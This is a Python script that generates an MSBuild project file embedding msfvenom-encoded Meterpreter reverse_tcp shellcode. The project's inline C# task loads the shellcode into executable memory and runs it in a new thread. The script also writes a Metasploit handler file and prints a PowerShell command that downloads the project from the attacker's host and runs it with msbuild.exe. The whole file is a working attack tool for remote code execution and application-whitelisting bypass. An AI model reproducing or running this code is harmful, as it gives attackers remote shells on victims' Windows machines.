#!/usr/bin/python
# -*- coding: utf-8 -*-
import argparse
import subprocess
import sys

def banner():
    print ("""
 ███▄ ▄███▓  ██████  ▄▄▄▄    █    ██  ██▓ ██▓    ▓█████▄     ██▓███   ▄▄▄     ▓██   ██▓ ██▓     ▒█████   ▄▄▄      ▓█████▄      ▄████ ▓█████  ███▄    █ 
▓██▒▀█▀ ██▒▒██    ▒ ▓█████▄  ██  ▓██▒▓██▒▓██▒    ▒██▀ ██▌   ▓██░  ██▒▒████▄    ▒██  ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌    ██▒ ▀█▒▓█   ▀  ██ ▀█   █ 
▓██    ▓██░░ ▓██▄   ▒██▒ ▄██▓██  ▒██░▒██▒▒██░    ░██   █▌   ▓██░ ██▓▒▒██  ▀█▄   ▒██ ██░▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌   ▒██░▄▄▄░▒███   ▓██  ▀█ ██▒
▒██    ▒██   ▒   ██▒▒██░█▀  ▓▓█  ░██░░██░▒██░    ░▓█▄   ▌   ▒██▄█▓▒ ▒░██▄▄▄▄██  ░ ▐██▓░▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌   ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒
▒██▒   ░██▒▒██████▒▒░▓█  ▀█▓▒▒█████▓ ░██░░██████▒░▒████▓    ▒██▒ ░  ░ ▓█   ▓██▒ ░ ██▒▓░░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓    ░▒▓███▀▒░▒████▒▒██░   ▓██░
░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░▒▓███▀▒░▒▓▒ ▒ ▒ ░▓  ░ ▒░▓  ░ ▒▒▓  ▒    ▒▓▒░ ░  ░ ▒▒   ▓▒█░  ██▒▒▒ ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒     ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ 
░  ░      ░░ ░▒  ░ ░▒░▒   ░ ░░▒░ ░ ░  ▒ ░░ ░ ▒  ░ ░ ▒  ▒    ░▒ ░       ▒   ▒▒ ░▓██ ░▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒      ░   ░  ░ ░  ░░ ░░   ░ ▒░
░      ░   ░  ░  ░   ░    ░  ░░░ ░ ░  ▒ ░  ░ ░    ░ ░  ░    ░░         ░   ▒   ▒ ▒ ░░    ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░    ░ ░   ░    ░      ░   ░ ░ 
       ░         ░   ░         ░      ░      ░  ░   ░                      ░  ░░ ░         ░  ░    ░ ░        ░  ░   ░             ░    ░  ░         ░ 
                          ░                       ░                            ░ ░                                 ░                                   
""")
    return

def gen_template(sc):
    return """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
             %s
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>""" % sc

if __name__ == "__main__":
    parser = argparse.ArgumentParser(epilog="sudo python msbuild_gen.py -a x86 -i 10 --lhost 192.168.2.1 --lport 9001")
    parser.add_argument("-a", "--architecture", dest="arch", help="Architecture")
    parser.add_argument("-i", "--iteration", dest="iter", help="Number of iteration for encoding")
    parser.add_argument("-l", "--lhost", dest="lhost", help="Ip to listen")
    parser.add_argument("-p","--lport", dest="lport", help="Port to listen")
    parser.add_argument("-m", "--msf", dest="msf",action='store_true',help="Executes the script with msf handle")

    args = parser.parse_args()
    if len(sys.argv) < 2:
        parser.print_usage()
        sys.exit(0)
    banner()

    lhost = args.lhost
    lport = args.lport
    iter = args.iter
    arch = args.arch
    
    if arch == "x86":
        payload = "windows/meterpreter/reverse_tcp"
    else:
        payload = "windows/x64/meterpreter/reverse_tcp"

    cmd = "msfvenom -p {} LHOST={} LPORT={} -e x86/shikata_ga_nai -i {} -f csharp".format(payload,lhost,lport,iter)# > out.cs    
    print("\033[92m[*]\033[97m Generating the payload:\n{}".format(cmd))


    DEVNULL = open("/dev/null","w")
    sc = subprocess.check_output(cmd.split(" "),stderr=DEVNULL)
    DEVNULL.close()

    out_name = "out_{}_{}.csproj".format(arch,lport)
    out = open(out_name,"w")
    out.write(gen_template(sc))
    out.close()
    remote_command = """Invoke-WebRequest "http://{}/{}" -OutFile "C:\Windows\Temp\out.csproj"; C:\windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe C:\Windows\Temp\out.csproj """.format(lhost,out_name)

    print("\033[92m[*]\033[97m Payload has been written to '{}'".format(out_name))
    
    handler = "use exploit/multi/handler\nset payload {}\nset lhost {}\nset lport {}\nrun".format(payload,lhost,lport)
    h = open("handler.rc","w")
    h.write(handler)
    h.close()
    
    if args.msf == True:
        print("\033[92m[*]\033[97m Remote command: \n{}\n\n".format(remote_command))
        subprocess.call('msfconsole -r handler.rc', shell=True)
    else:
        print("\033[92m[*]\033[97m You can start your handler now with:")
        print handler
        print("\033[92m[*]\033[97m Remote command: \n{}".format(remote_command))
    




